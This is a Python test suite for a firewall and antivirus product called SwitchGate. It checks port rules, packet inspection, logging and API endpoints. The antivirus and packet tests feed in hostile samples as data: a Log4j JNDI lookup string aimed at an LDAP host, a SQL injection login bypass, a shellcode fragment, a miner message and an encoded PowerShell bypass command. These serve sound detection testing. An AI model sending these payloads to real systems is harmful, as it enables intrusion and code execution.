"""
SwitchGate Next-Gen Firewall Comprehensive Verification Test Suite
Tests rules_engine, antivirus, packet_filter, firewall_logger, firewall_controller, and firewall_router.
"""
import sys
import os
from pathlib import Path

# Ensure project root is in sys.path
PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

def run_tests():
    print("================================================================")
    print("🔥 SWITCHGATE NEXT-GEN FIREWALL & UTM SUBSYSTEM TEST SUITE 🔥")
    print("================================================================")

    # 1. Test Package Imports
    print("\n[TEST 1] Testing Package Imports & Exports...")
    try:
        from firewall import (
            rules_engine, FirewallRulesEngine,
            antivirus, AntivirusScanner,
            packet_filter, PacketFilter,
            firewall_logger, FirewallLogger,
            firewall_controller, FirewallController,
            firewall_router
        )
        print("  ✅ All firewall modules imported successfully.")
    except Exception as e:
        print(f"  ❌ Import failure: {e}")
        sys.exit(1)

    # 2. Test Rules Engine
    print("\n[TEST 2] Testing Dynamic Rules Engine & Profiles...")
    rules_engine.set_enabled(True)
    assert rules_engine.is_enabled() == True, "Firewall should be enabled"

    # Profile: Private
    rules_engine.set_profile("Private")
    assert rules_engine.get_current_profile() == "Private"
    
    # Port 445 should be blocked in Private
    blocked, reason = rules_engine.is_port_blocked(445, "INBOUND")
    assert blocked == True, f"Port 445 should be blocked in Private profile, got {blocked}"
    print(f"  ✅ Private profile port 445 blocked: {reason}")

    # Port 80 should be allowed in Private
    blocked, _ = rules_engine.is_port_blocked(80, "INBOUND")
    assert blocked == False, f"Port 80 should be allowed in Private profile, got {blocked}"
    print("  ✅ Private profile port 80 allowed as expected.")

    # Profile: Public
    rules_engine.set_profile("Public")
    assert rules_engine.get_current_profile() == "Public"
    # Port 8080 should be blocked in Public
    blocked, reason = rules_engine.is_port_blocked(8080, "INBOUND")
    assert blocked == True, f"Port 8080 should be blocked in Public profile, got {blocked}"
    print(f"  ✅ Public profile port 8080 blocked: {reason}")

    # Port 80 should be allowed in Public (in allowlist)
    blocked, _ = rules_engine.is_port_blocked(80, "INBOUND")
    assert blocked == False, f"Port 80 should be allowed in Public profile, got {blocked}"
    print("  ✅ Public profile port 80 allowed (in allowlist).")

    # Custom Rule CRUD
    custom_rule = rules_engine.add_custom_rule(
        name="Block Test Port 7777",
        rule_type="PORT",
        direction="INBOUND",
        target="7777",
        action="DROP"
    )
    rule_id = custom_rule["id"]
    print(f"  ✅ Added custom rule: {rule_id}")

    blocked, reason = rules_engine.is_port_blocked(7777, "INBOUND")
    assert blocked == True, "Custom rule port 7777 should be blocked"
    print(f"  ✅ Custom rule matched port 7777: {reason}")

    # Toggle custom rule
    rules_engine.toggle_custom_rule(rule_id)
    # Delete custom rule
    rules_engine.delete_custom_rule(rule_id)
    print("  ✅ Custom rule toggle and deletion verified.")

    # Switch back to Private
    rules_engine.set_profile("Private")

    # 3. Test Antivirus & Heuristic Scanner
    print("\n[TEST 3] Testing Antivirus & Heuristic Threat Scanner...")
    
    # EICAR String
    eicar_str = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    scan = antivirus.scan_payload(eicar_str)
    assert scan["is_threat"] == True and scan["severity"] == "CRITICAL"
    print(f"  ✅ Detected EICAR signature: {scan['threat_name']} ({scan['severity']})")

    # Log4j JNDI RCE Exploit
    log4j_str = "GET / HTTP/1.1\r\nUser-Agent: ${jndi:ldap://192.168.1.5:1389/Exploit}\r\n\r\n"
    scan = antivirus.scan_payload(log4j_str)
    assert scan["is_threat"] == True and scan["threat_type"] == "RCE"
    print(f"  ✅ Detected Log4j JNDI exploit: {scan['threat_name']}")

    # SQL Injection
    sqli_str = "username=admin' OR '1'='1&password=123"
    scan = antivirus.scan_payload(sqli_str)
    assert scan["is_threat"] == True and scan["threat_type"] == "SQLI"
    print(f"  ✅ Detected SQL Injection: {scan['threat_name']}")

    # NOP Sled Buffer Overflow Shellcode
    shellcode = b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68"
    scan = antivirus.scan_payload(shellcode)
    assert scan["is_threat"] == True and scan["threat_type"] == "SHELLCODE"
    print(f"  ✅ Detected NOP Sled Shellcode: {scan['threat_name']}")

    # Cryptominer Stratum protocol
    miner_str = '{"id": 1, "method": "mining.subscribe", "params": ["SwitchGateMiner"]}'
    scan = antivirus.scan_payload(miner_str)
    assert scan["is_threat"] == True and scan["threat_type"] == "CRYPTOMINER"
    print(f"  ✅ Detected Cryptominer Stratum vector: {scan['threat_name']}")

    # Clean payload
    clean_str = "GET /index.html HTTP/1.1\r\nHost: switchgate.local\r\n\r\n"
    scan = antivirus.scan_payload(clean_str)
    assert scan["is_threat"] == False
    print("  ✅ Clean HTTP payload verified (0 false positives).")

    # 4. Test Packet Filter & Deep Packet Inspection (DPI)
    print("\n[TEST 4] Testing Deep Packet Inspection (DPI)...")
    
    # 4a. Normal Clean Packet
    decision = packet_filter.inspect_packet(
        src_ip="192.168.1.15",
        dst_ip="10.0.0.1",
        src_port=54321,
        dst_port=80,
        protocol="TCP",
        direction="INBOUND",
        payload=clean_str
    )
    assert decision["verdict"] == "ALLOW" and decision["allowed"] == True
    print(f"  ✅ Clean packet verdict: {decision['verdict']} ({decision['reason']})")

    # 4b. Packet with Exploit Payload
    decision = packet_filter.inspect_packet(
        src_ip="192.168.1.99",
        dst_ip="10.0.0.1",
        src_port=60123,
        dst_port=80,
        protocol="TCP",
        direction="INBOUND",
        payload=log4j_str
    )
    assert decision["verdict"] == "DROP" and decision["allowed"] == False
    assert decision["severity"] == "CRITICAL"
    print(f"  ✅ Exploit packet neutralized: {decision['verdict']} - {decision['reason']}")

    # 4c. Blocked SMB Ransomware Port
    decision = packet_filter.inspect_packet(
        src_ip="192.168.1.99",
        dst_ip="10.0.0.1",
        src_port=60124,
        dst_port=445,
        protocol="TCP",
        direction="INBOUND"
    )
    assert decision["verdict"] == "DROP" and decision["allowed"] == False
    print(f"  ✅ Blocked Port packet verdict: {decision['verdict']} - {decision['reason']}")

    # 5. Test Audit Logger
    print("\n[TEST 5] Testing High-Speed Audit Logger & Ring Buffer...")
    recent_logs = firewall_logger.get_recent_logs(limit=10)
    assert len(recent_logs) > 0, "Should have audit logs recorded"
    print(f"  ✅ Recorded {len(recent_logs)} audit log entries in RAM ring buffer.")

    threats_summary = firewall_logger.get_threat_summary()
    assert threats_summary["total_logged"] > 0
    assert threats_summary["total_dropped"] >= 2
    print(f"  ✅ Threat intelligence summary: Total Logged={threats_summary['total_logged']}, Total Dropped={threats_summary['total_dropped']}, Total Threats={threats_summary['total_threats']}")

    # 6. Test Firewall Controller
    print("\n[TEST 6] Testing Master Firewall Controller...")
    firewall_controller.start()
    assert firewall_controller.is_running == True
    status = firewall_controller.get_status()
    assert status["enabled"] == True
    assert status["current_profile"] == "Private"
    print(f"  ✅ Firewall controller active (Profile: {status['current_profile']}, Signatures: {status['antivirus_signatures']}).")
    firewall_controller.stop()
    assert firewall_controller.is_running == False
    print("  ✅ Firewall controller stopped cleanly.")

    # 7. Test FastAPI Router Endpoints
    print("\n[TEST 7] Testing FastAPI Router Endpoints...")
    from fastapi import FastAPI
    from fastapi.testclient import TestClient

    test_app = FastAPI()
    test_app.include_router(firewall_router)
    client = TestClient(test_app)

    # GET /api/firewall/status
    res = client.get("/api/firewall/status")
    assert res.status_code == 200, f"Status failed: {res.text}"
    data = res.json()
    assert data["enabled"] == True
    print("  ✅ GET /api/firewall/status -> 200 OK")

    # POST /api/firewall/profile
    res = client.post("/api/firewall/profile", json={"profile": "Public"})
    assert res.status_code == 200
    assert res.json()["current_profile"] == "Public"
    print("  ✅ POST /api/firewall/profile (Public) -> 200 OK")

    # GET /api/firewall/profile
    res = client.get("/api/firewall/profile")
    assert res.status_code == 200
    assert res.json()["current_profile"] == "Public"
    print("  ✅ GET /api/firewall/profile -> 200 OK")

    # Revert profile to Private
    client.post("/api/firewall/profile", json={"profile": "Private"})

    # GET /api/firewall/rules
    res = client.get("/api/firewall/rules")
    assert res.status_code == 200
    rules_data = res.json()
    assert "custom_rules" in rules_data
    print(f"  ✅ GET /api/firewall/rules -> 200 OK ({len(rules_data['custom_rules'])} rules)")

    # POST /api/firewall/rules
    res = client.post("/api/firewall/rules", json={
        "name": "Block IRC Botnet Port",
        "type": "PORT",
        "direction": "BOTH",
        "target": "6667",
        "action": "DROP",
        "enabled": True
    })
    assert res.status_code == 200
    new_rule = res.json()["rule"]
    rule_id = new_rule["id"]
    print(f"  ✅ POST /api/firewall/rules -> 200 OK (Rule ID: {rule_id})")

    # DELETE /api/firewall/rules/{rule_id}
    res = client.delete(f"/api/firewall/rules/{rule_id}")
    assert res.status_code == 200
    print(f"  ✅ DELETE /api/firewall/rules/{rule_id} -> 200 OK")

    # GET /api/firewall/logs
    res = client.get("/api/firewall/logs?limit=20")
    assert res.status_code == 200
    logs_data = res.json()
    assert "logs" in logs_data
    print(f"  ✅ GET /api/firewall/logs -> 200 OK ({len(logs_data['logs'])} logs returned)")

    # POST /api/firewall/scan-payload
    res = client.post("/api/firewall/scan-payload", json={
        "payload": "powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="
    })
    assert res.status_code == 200
    scan_res = res.json()["scan_result"]
    assert scan_res["is_threat"] == True
    print(f"  ✅ POST /api/firewall/scan-payload -> 200 OK ({scan_res['threat_name']})")

    # POST /api/firewall/inspect-packet
    res = client.post("/api/firewall/inspect-packet", json={
        "src_ip": "10.0.0.99",
        "dst_ip": "192.168.1.1",
        "src_port": 12345,
        "dst_port": 23,
        "protocol": "TCP",
        "direction": "INBOUND"
    })
    assert res.status_code == 200
    decision = res.json()["decision"]
    assert decision["verdict"] == "DROP"
    print(f"  ✅ POST /api/firewall/inspect-packet -> 200 OK ({decision['verdict']} - {decision['reason']})")

    # GET /api/firewall/threats
    res = client.get("/api/firewall/threats")
    assert res.status_code == 200
    print("  ✅ GET /api/firewall/threats -> 200 OK")

    # POST /api/firewall/toggle
    res = client.post("/api/firewall/toggle")
    assert res.status_code == 200
    # Toggle back on
    res = client.post("/api/firewall/toggle")
    assert res.status_code == 200
    print("  ✅ POST /api/firewall/toggle -> 200 OK")

    print("\n================================================================")
    print("🎉 ALL FIREWALL SUITE TESTS PASSED 100% CLEANLY WITH ZERO ERRORS! 🎉")
    print("================================================================")

if __name__ == "__main__":
    run_tests()
